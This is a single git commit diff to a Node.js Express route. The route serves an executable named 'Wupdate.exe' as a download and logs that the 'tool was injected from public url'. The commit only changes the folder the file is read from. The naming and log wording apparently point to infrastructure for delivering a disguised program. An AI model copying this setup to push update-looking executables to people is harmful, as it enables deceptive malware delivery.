0403e17233d772f3d4da31da287b796194f3846a
Pch12_Projects <pch12.656@gmail.com>
2021-06-29 22:46:56 +0300

    Update publicToolRoute.js

--- FilesRouters/routes/publicToolRoute.js
+++ FilesRouters/routes/publicToolRoute.js
@@ -8,7 +8,7 @@ const appDir = path.dirname(require.main.filename);
 router.route('/').get((req, res) => {
     res.setHeader('Content-disposition', 'attachment; filename=Wupdate.exe');
     res.setHeader('Content-type', 'application/x-msdownload');
-    let file = fs.createReadStream(path.resolve(appDir, 'tool', 'Wupdate.exe'));
+    let file = fs.createReadStream(path.resolve(appDir, 'ToolScripts', 'Wupdate.exe'));
     file.pipe(res)
     Utils.LogToFile(`[+] Tool was injected from public url`)
 })
